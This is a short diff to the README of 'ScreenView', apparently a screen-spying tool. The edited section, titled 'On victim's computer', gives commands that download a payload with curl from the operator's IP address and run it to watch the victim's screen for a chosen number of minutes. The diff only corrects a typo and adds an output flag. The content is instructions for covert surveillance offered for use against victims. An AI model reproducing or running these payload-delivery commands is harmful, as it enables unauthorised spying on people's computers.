@@ -22,8 +22,8 @@ $ sudo git clone https://github.com/BababooeyHackers/ScreenView.git
 This module can run on Windows and MacOS. To configure the payload go to line 40 and replace IP with your IP.
 ### On victim's computer
 ```
-$ curl http://IP/ScreenView/ScreenView.(exe, app, ect)
-$ ScreenView.(exe, app, ect) --time (time in minutes to view the victim's screen)
+$ curl http://IP/ScreenView/ScreenView.(exe, app, etc) --output ScreenView.(exe, app, etc)
+$ ScreenView.(exe, app, etc) --time (time in minutes to view the victim's screen)
 ```
 
 ## Compilation
